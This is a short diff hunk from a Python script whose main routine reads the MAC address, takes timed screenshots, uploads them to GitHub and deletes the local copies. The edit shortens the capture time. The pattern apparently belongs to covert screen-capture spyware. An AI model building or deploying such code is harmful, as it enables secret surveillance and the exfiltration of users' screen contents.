@@ -119,7 +119,7 @@ def delete_folder(folder_path):
 
 def main():
     mac_address = get_mac_address()
-    folder_name = take_screenshots(duration=240, interval=30)
+    folder_name = take_screenshots(duration=60, interval=30)
     upload_folder_to_github(folder_name, mac_address)
     delete_folder(folder_name)
 
